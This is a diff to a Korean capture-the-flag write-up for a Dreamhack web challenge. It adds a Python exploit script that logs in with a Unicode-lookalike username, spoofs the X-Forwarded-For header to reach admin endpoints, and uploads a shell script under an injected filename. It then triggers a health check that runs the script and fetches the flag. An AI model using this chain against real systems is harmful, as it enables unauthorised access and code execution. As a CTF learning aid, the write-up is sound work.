@@ -189,5 +189,56 @@ Health Check 기능을 사용하여 업로드한 malicious.sh 를 실행한다. 
 
 이제 파일이 생성되었으므로 /uploads/client/test.txt 파일에 접근한다. 그러면 test.txt 파일이 다운로드되고, FLAG 값을 확인할 수 있다.
 
+![image](./images/21_수정.png)
+
+## 익스플로잇 코드
+
+```
+import requests
+
+URL = "http://host1.dreamhack.games:20299"
+
+login = {"username" : "\u212Aimgildong123","password" : "0p1q9o2w8i3e"}
+
+headers = {"X-Forwarded-For" : "127.0.0.1"}
+
+validate_param = {"path" : "malicious.sh\";dummy=.txt"}
+
+target = {"target" : "malicious"}
+
+session = requests.Session()
+
+# 0. login
+
+session.post(f"{URL}/auth/login",json=login)
+
+# 1. Upload File
+
+with open('./malicious.sh";dummy=.txt','rb') as f:
+    upload = {'file' : f}
+    res = session.post(f"{URL}/admin/upload",headers=headers,files=upload)
+
+# 2. Validate File
+
+validate_req = session.post(f"{URL}/admin/validate",headers=headers,json=validate_param)
+
+# 3. Health Check
+
+healthcheck_req = session.post(f"{URL}/admin/healthcheck",headers=headers,json=target)
+
+# 4. get FLAG
+
+flag = session.get(f"{URL}/uploads/client/test.txt")
+
+print("FLAG : " + flag.text)
+```
+
+## 4. 참고
+
+- https://gosecure.github.io/presentations/2020_02_28_confoo/unicode_vulnerabilities_that_could_bite_you.pdf
+ 
+- https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/X-Forwarded-For
+ 
+- https://github.com/gin-gonic/gin/issues/3555
 
 
